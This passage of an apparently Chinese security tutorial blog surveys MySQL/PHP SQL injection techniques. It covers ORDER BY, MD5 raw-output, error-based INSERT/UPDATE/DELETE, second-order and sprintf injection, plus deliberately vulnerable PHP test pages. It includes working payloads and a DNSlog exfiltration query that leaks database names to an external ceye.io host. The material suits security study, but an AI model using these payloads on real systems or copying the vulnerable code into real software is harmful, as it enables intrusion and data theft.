class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = @<span class="variable">$_GET</span>[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line">//id没有做 整形转换</span><br><span class="line"><span class="keyword">if</span>( !isset(<span class="variable">$id</span>)|| empty(<span class="variable">$id</span>) )&#123;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="string">'get.id 参数不能为空'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">try&#123;</span><br><span class="line">    //分别对应的是 地址，端口号，连接的数据库，编码</span><br><span class="line">    <span class="variable">$dsn</span> = <span class="string">"mysql:host=127.0.0.1; port=3306; dbname=test; charset=utf8"</span>;</span><br><span class="line"></span><br><span class="line">    //帐号</span><br><span class="line">    <span class="variable">$user</span> = <span class="string">'root'</span>;</span><br><span class="line"></span><br><span class="line">    //密码 </span><br><span class="line">    <span class="variable">$psw</span> =<span class="string">'root'</span>; </span><br><span class="line"></span><br><span class="line">    //连接到 MySQL</span><br><span class="line">    <span class="variable">$pdo</span> = new PDO(<span class="variable">$dsn</span>,<span class="variable">$user</span>,<span class="variable">$psw</span>);</span><br><span class="line"></span><br><span class="line">    //准备执行的sql语句  start</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">'select * from tdb_goods where goods_id ='</span>.<span class="string">"'&#123;<span class="variable">$id</span>&#125;'"</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">    //准备执行的sql语句 end</span><br><span class="line">    </span><br><span class="line">    //进行查询数据库出问题则报具体错误</span><br><span class="line">    <span class="variable">$res</span> = <span class="variable">$pdo</span>-&gt;query(<span class="variable">$sql</span>) or var_dump(<span class="variable">$pdo</span>-&gt;errorInfo());</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$mon</span> = <span class="variable">$res</span>-&gt;fetch(PDO::FETCH_ASSOC);</span><br><span class="line">    print_r( <span class="variable">$mon</span> );</span><br><span class="line"></span><br><span class="line">&#125; catch (Exception <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="built_in">print</span> <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">    <span class="built_in">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="mysql约束攻击"><a href="#mysql约束攻击" class="headerlink" title="mysql约束攻击"></a>mysql约束攻击</h2><p>详情看：<a href="https://ch1st.github.io/2017/10/19/Mysql%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">https://ch1st.github.io/2017/10/19/Mysql%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB/</a><br>出现在注册用户时，对用户名参数的多余空格没有过滤。利用了在mysql数据库中当插入某个字段的值超过了预设的长度,mysql会自动造成截断。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create table user(id int primary key, user varchar(10),<span class="built_in">pwd</span> varchar(20)); //创建一个表</span><br><span class="line">insert into user values(1,<span class="string">'admin'</span>,<span class="string">'123'</span>); //插入数据</span><br><span class="line">insert into user values(2,<span class="string">'admin                                          '</span>,<span class="string">'123'</span>);</span><br><span class="line">select length(user) from user; //查看数据长度</span><br></pre></td></tr></table></figure><h2 id="order-by-注入"><a href="#order-by-注入" class="headerlink" title="order by 注入"></a>order by 注入</h2><p>详细看<a href="http://www.cnblogs.com/icez/p/Mysql-Order-By-Injection-Summary.html" target="_blank" rel="noopener">http://www.cnblogs.com/icez/p/Mysql-Order-By-Injection-Summary.html</a><br>0x1 利用报错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">利用regexp</span><br><span class="line">http://192.168.239.2:81/?order=(select+1+regexp+<span class="keyword">if</span>(1=1,1,0x00)) 正常</span><br><span class="line">http://192.168.239.2:81/?order=(select+1+regexp+<span class="keyword">if</span>(1=2,1,0x00))  错误</span><br><span class="line">利用updatexml</span><br><span class="line">http://192.168.239.2:81/?order=updatexml(1,<span class="keyword">if</span>(1=1,1,user()),1)  正确</span><br><span class="line">http://192.168.239.2:81/?order=updatexml(1,<span class="keyword">if</span>(1=2,1,user()),1) 错误</span><br><span class="line">利用extractvalue</span><br><span class="line">http://192.168.239.2:81/?order=extractvalue(1,<span class="keyword">if</span>(1=1,1,user())) 正确</span><br><span class="line">http://192.168.239.2:81/?order=extractvalue(1,<span class="keyword">if</span>(1=2,1,user())) 错误</span><br></pre></td></tr></table></figure><p>0x2 基于盲注</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">注意如果直接<span class="keyword">if</span>(1=2,1,SLEEP(2))，sleep时间将会变成2*当前表中记录的数目，将会对服务器造成一定的拒绝服务攻击</span><br><span class="line"></span><br><span class="line">/?order=<span class="keyword">if</span>(1=1,1,(SELECT(1)FROM(SELECT(SLEEP(2)))<span class="built_in">test</span>)) 正常响应时间</span><br><span class="line">/?order=<span class="keyword">if</span>(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))<span class="built_in">test</span>)) sleep 2秒</span><br></pre></td></tr></table></figure><p>0x3 sqlmap<br>sqlmap测试<br>在没有过滤的情况下是能够检测到注入的</p><p>测试样题<br>index.php </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">mysql_connect(<span class="string">"127.0.0.1"</span>, <span class="string">"root"</span>, <span class="string">"root"</span>) or die(<span class="string">"Database connection failed "</span>);</span><br><span class="line">mysql_select_db(<span class="string">"sqlidemo"</span>) or die(<span class="string">"Select database failed"</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$order</span> = <span class="variable">$_GET</span>[<span class="string">'order'</span>] ? <span class="variable">$_GET</span>[<span class="string">'order'</span>] : <span class="string">'name'</span>;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">"select id,name,price from goods order by <span class="variable">$order</span>"</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$reslist</span> = array();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>, MYSQL_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line">  array_push(<span class="variable">$reslist</span>, <span class="variable">$row</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> json_encode(<span class="variable">$reslist</span>);</span><br></pre></td></tr></table></figure><p>sql</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">create database sqlidemo;</span><br><span class="line">use sqlidemo;</span><br><span class="line">create table goods (id int(4) not null primary key auto_increment, name char(32) not null, price int(4) not null);</span><br><span class="line">insert into goods (name, price)  values(<span class="string">"apple"</span>, 10);</span><br><span class="line">insert into goods (name, price) values(<span class="string">"banana"</span>, 15);</span><br><span class="line">insert into goods (name, price) values(<span class="string">"peach"</span>, 20);</span><br></pre></td></tr></table></figure><h2 id="MD5注入"><a href="#MD5注入" class="headerlink" title="MD5注入"></a>MD5注入</h2><p>详细可看<a href="http://blog.lvguangfa.cn/ctf/135.html" target="_blank" rel="noopener">http://blog.lvguangfa.cn/ctf/135.html</a><br>当php中使用到 md5($str,true) 输出md5值时，二进制被HEXdecode后可能会包含例如’or 1#的字符，从而产生sql注入</p><p>先看php中的md5函数，它有两个参数string和raw。<br>第一个参数string是必需的，规定要计算的字符串。<br>第二个参数raw可选，规定十六进制或二进制输出格式：</p><p>TRUE - 原始 - 16 字符二进制格式<br>FALSE - 默认 - 32 字符十六进制数<br>注入姿势： </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=129581926211651571912466741651878684928  //T0Do<span class="comment">#'or'8</span></span><br><span class="line">password=ffifdyop //<span class="string">'or'</span>6]!r,b</span><br></pre></td></tr></table></figure><p>测试题目 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">'password'</span>];</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">"SELECT * FROM admin WHERE username = 'admin' and password = '"</span>.md5(<span class="variable">$password</span>,<span class="literal">true</span>).<span class="string">"'"</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$link</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span>(mysqli_num_rows(<span class="variable">$result</span>)&gt;0)&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'Success'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'Failure'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="insert、update和delete报错注入"><a href="#insert、update和delete报错注入" class="headerlink" title="insert、update和delete报错注入"></a>insert、update和delete报错注入</h2><p><a href="http://vinc.top/2017/04/06/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91insert%E3%80%81update%E5%92%8Cdelete%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">传统insert、update和delete报错注入 </a><br><a href="https://osandamalith.com/2017/02/08/mysql-injection-in-update-insert-and-delete/" target="_blank" rel="noopener">新式MySQL Injection in Update, Insert and Delete</a><br>0x1 传统利用方式<br>0x 1.1 insert  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">这里我们用updatexml来演示</span><br><span class="line">使用逻辑运算符（and or xor &amp;&amp; ||）</span><br><span class="line">mysql&gt; insert into users values (3,<span class="string">'name'</span> xor updatexml(2,concat(0x7e,(version())),0) xor <span class="string">''</span>,<span class="string">'pass'</span>);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: <span class="string">'~5.5.40-log'</span></span><br><span class="line">mysql&gt; insert into users values (5,<span class="string">'name'</span> and updatexml(2,concat(0x7e,(version())),0) and <span class="string">''</span>,<span class="string">'pass'</span>);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: <span class="string">'~5.5.40-log'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用算数运算符（+ – * /）</span><br><span class="line">mysql&gt; insert into users values (3,<span class="string">'name'</span>+updatexml(2,concat(0x7e,(version())),0) xor <span class="string">''</span>,<span class="string">'pass'</span>);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: <span class="string">'~5.5.40-log'</span></span><br><span class="line">mysql&gt; insert into users values (3,<span class="string">'name'</span>*updatexml(2,concat(0x7e,(version())),0) xor <span class="string">''</span>,<span class="string">'pass'</span>);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: <span class="string">'~5.5.40-log'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用位运算符连接（| &amp;）</span><br><span class="line">mysql&gt; insert into users values (3,<span class="string">'name'</span>&amp;updatexml(2,concat(0x7e,(version())),0) xor <span class="string">''</span>,<span class="string">'pass'</span>);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: <span class="string">'~5.5.40-log'</span></span><br><span class="line">mysql&gt; insert into users values (3,<span class="string">'name'</span>|updatexml(2,concat(0x7e,(version())),0) xor <span class="string">''</span>,<span class="string">'pass'</span>);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: <span class="string">'~5.5.40-log'</span></span><br></pre></td></tr></table></figure><p>0x1.2 update</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; update users <span class="built_in">set</span> username = <span class="string">'name'</span> and updatexml(2,concat(0x7e,(version())),0) and <span class="string">''</span> <span class="built_in">where</span> id = 5;</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: <span class="string">'~5.5.40-log'</span></span><br></pre></td></tr></table></figure><p>0x1.3 delete</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; delete from users <span class="built_in">where</span> id = 5 or updatexml(2,concat(0x7e,(version())),0) or <span class="string">''</span>;</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: <span class="string">'~5.5.40-log'</span></span><br></pre></td></tr></table></figure><p>0x2 新式利用<br>语句格式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select conv(hex(substr(user(),1 + (n-1) * 8, 8 * n)), 16, 10);</span><br></pre></td></tr></table></figure><p>0x2.1 update</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update emails <span class="built_in">set</span> email_id=<span class="string">'osanda'</span>|conv(hex(substr(user(),1 + (n-1) * 8, 8 * n)),16, 10) <span class="built_in">where</span> id=<span class="string">'16'</span>;</span><br></pre></td></tr></table></figure><p>0x2.2 Insert</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into users values (17,<span class="string">'james'</span>, <span class="string">'bond'</span>|conv(hex(substr(user(),1 + (n-1) * 8, 8 * n)),16, 10);</span><br></pre></td></tr></table></figure><p>0x2.3 Limitations in MySQL 5.7</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update ignore users <span class="built_in">set</span> username = <span class="string">'osanda'</span> | conv(hex(substr(user(),1 + (1-1) * 8, 8 * 1)),16, 10) <span class="built_in">where</span> id=14;</span><br></pre></td></tr></table></figure><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p> 详细可看此文章:<a href="http://www.beesfun.com/2017/03/28/MySQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-%E4%B8%89/" target="_blank" rel="noopener">MySQL注入系列之二次注入(三)</a><br> 测试代码<br> config.php<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">mysql_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'mysql'</span>);</span><br><span class="line">mysql_select_db(<span class="string">'sqlinject'</span>);</span><br><span class="line">mysql_set_charset(<span class="string">'utf-8'</span>);</span><br><span class="line"><span class="keyword">if</span> (!get_magic_quotes_gpc())&#123;</span><br><span class="line">    <span class="keyword">if</span> (!empty(<span class="variable">$_GET</span>))&#123;</span><br><span class="line">        <span class="variable">$_GET</span> = addslashes_deep(<span class="variable">$_GET</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!empty(<span class="variable">$_POST</span>))&#123;</span><br><span class="line">        <span class="variable">$_POST</span> = addslashes_deep(<span class="variable">$_POST</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_COOKIE</span> = addslashes_deep(<span class="variable">$_COOKIE</span>);</span><br><span class="line">    <span class="variable">$_REQUEST</span> = addslashes_deep(<span class="variable">$_REQUEST</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> addslashes_deep(<span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (empty(<span class="variable">$value</span>))&#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$value</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">return</span> is_array(<span class="variable">$value</span>) ? array_map(<span class="string">'addslashes_deep'</span>, <span class="variable">$value</span>): addslashes(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br> reg.php<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">include <span class="string">"config.php"</span>;</span><br><span class="line"><span class="keyword">if</span>(!empty(<span class="variable">$_POST</span>[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">'username'</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">'password'</span>];</span><br><span class="line">    <span class="variable">$email</span> = <span class="variable">$_POST</span>[<span class="string">'email'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">"INSERT INTO `sqlinject`.`users` (`id`, `username`, `password`, `email`)</span></span><br><span class="line"><span class="string">           VALUE (NULL, '<span class="variable">$username</span>', '<span class="variable">$password</span>', '<span class="variable">$email</span>');"</span>;</span><br><span class="line">    <span class="variable">$row</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>)&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"注册成功"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"注册失败"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span> /&gt;</span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">    username&lt;input <span class="built_in">type</span>=<span class="string">"text"</span> name=<span class="string">"username"</span>&gt;&lt;br/&gt;</span><br><span class="line">    password&lt;input <span class="built_in">type</span>=<span class="string">"text"</span> name=<span class="string">"password"</span>&gt;&lt;br/&gt;</span><br><span class="line">    email&lt;input <span class="built_in">type</span>=<span class="string">"text"</span> name=<span class="string">"email"</span>&gt;&lt;br/&gt;</span><br><span class="line">    &lt;input <span class="built_in">type</span>=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"ok"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><br> search.php<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">include <span class="string">"config.php"</span>;</span><br><span class="line"><span class="keyword">if</span>(!empty(<span class="variable">$_POST</span>[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    <span class="variable">$email</span> = <span class="variable">$_POST</span>[<span class="string">'email'</span>];</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">"select * from users where email='&#123;<span class="variable">$email</span>&#125;'"</span>;</span><br><span class="line">    <span class="variable">$row</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>)&#123;</span><br><span class="line">        <span class="variable">$rows</span> = mysql_fetch_array(<span class="variable">$row</span>);</span><br><span class="line">        <span class="variable">$username</span> = <span class="variable">$rows</span>[<span class="string">'username'</span>];</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">"select * from users where username='<span class="variable">$username</span>'"</span>;</span><br><span class="line">        <span class="variable">$row</span> = mysql_query(<span class="variable">$sql</span>) or die(mysql_error());</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$row</span>)&#123;</span><br><span class="line">            <span class="variable">$rows</span> = mysql_fetch_array(<span class="variable">$row</span>);</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">$rows</span>[<span class="string">'username'</span>].<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">$rows</span>[<span class="string">'password'</span>].<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">$rows</span>[<span class="string">'email'</span>].<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span> /&gt;</span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">    search email&lt;input <span class="built_in">type</span>=<span class="string">"text"</span> name=<span class="string">"email"</span>&gt;&lt;br/&gt;</span><br><span class="line">    &lt;input <span class="built_in">type</span>=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"ok"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></p><h2 id="dns注入"><a href="#dns注入" class="headerlink" title="dns注入"></a>dns注入</h2><p>DNSLOG 注入 ¶<br>DNS 在解析的时候会留下日志，通过读取多级域名的解析日志，来获取信息。简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息。</p><p>dnslog 平台：<a href="http://ceye.io/" target="_blank" rel="noopener">http://ceye.io/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use security;</span><br><span class="line">Database changed</span><br><span class="line"></span><br><span class="line">mysql&gt; select load_file(<span class="string">'\\\\test.xxx.ceye.io\\abc'</span>);</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| load_file(<span class="string">'\\\\test.xxx.ceye.io\\abc'</span>) |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| NULL                                      |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (22.05 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select load_file(concat(<span class="string">'\\\\'</span>,(select database()),<span class="string">'.xxx.ceye.io\\abc'</span>));</span><br><span class="line">+----------------------------------------------------------------------+</span><br><span class="line">| load_file(concat(<span class="string">'\\\\'</span>,(select database()),<span class="string">'.xxx.ceye.io\\abc'</span>)) |</span><br><span class="line">+----------------------------------------------------------------------+</span><br><span class="line">| NULL                                                                 |</span><br><span class="line">+----------------------------------------------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><h2 id="sprintf注入"><a href="#sprintf注入" class="headerlink" title="sprintf注入"></a>sprintf注入</h2><p>1，sprintf(),函数是php中的函数<br>2，作用是将格式化字符串写入变量中<br>3，函数形式为sprintf(format,arg1,arg2,arg++)   </p><p> 参数说明：<br><img src="../../images/loopholes/sql/5.png" alt=""><br>*<em>若%符号多于arg参数，则需要占位符，占位符格式为“%number$” 其中number表示该项与第几个arg匹配，如若与第一个匹配     则占位符为“%1$” *</em> </p><p>sprintf注入的原理就是:<br>我们用一个15种类型之外的 “&quot;来代替格式字符类型让函数替换为空，则“%1$&#39;”后面的单引号就能闭合前面的单引号 。<br>如果我们输入”%&quot;或者”%1$&quot;,他会把反斜杠当做格式化字符的类型，然而找不到匹配的项那么”%&quot;,”%1$&quot;就因为没有经过任何处理而被替换为空。 </p><p>例子:      </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//addslashes()函数：在预定义前面加反斜杠，预定义符有单引号（'），双引号（"），反斜杠（\），NULL</span></span><br><span class="line">$input = addslashes (<span class="string">"%1$' and 1=1#"</span> );</span><br><span class="line">$b = sprintf (<span class="string">"AND b='%s'"</span>, $input );</span><br><span class="line">$sql = sprintf (<span class="string">"SELECT * FROM t WHERE a='%s' $b "</span>, <span class="string">'admin'</span> );</span><br><span class="line"><span class="keyword">echo</span>  $sql ;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">1</span>$\<span class="string">' and 1=1#</span></span><br><span class="line"><span class="string">AND b='</span>%<span class="number">1</span>$\<span class="string">' and 1=1#'</span></span><br><span class="line">SELECT * FROM t WHERE a=<span class="string">'admin'</span> <span class="keyword">AND</span> b=<span class="string">''</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#'</span></span><br></pre></td></tr></table></figure><p>另一个例子:  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$input1 = <span class="string">'%1$c) OR 1 = 1 /*'</span> ;</span><br><span class="line">$input2 = <span class="number">39</span> ;</span><br><span class="line">$sql = <span class="string">"SELECT * FROM foo WHERE bar IN (' $input1 ') AND baz = %s"</span> ;</span><br><span class="line"><span class="keyword">echo</span>($sql.<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">$sql = sprintf ( $sql , $input2 );</span><br><span class="line"><span class="keyword">echo</span>  $sql ;</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM foo WHERE bar IN (<span class="string">' %1$c) OR 1 = 1 /* '</span>) <span class="keyword">AND</span> baz = %s</span><br><span class="line">SELECT * FROM foo 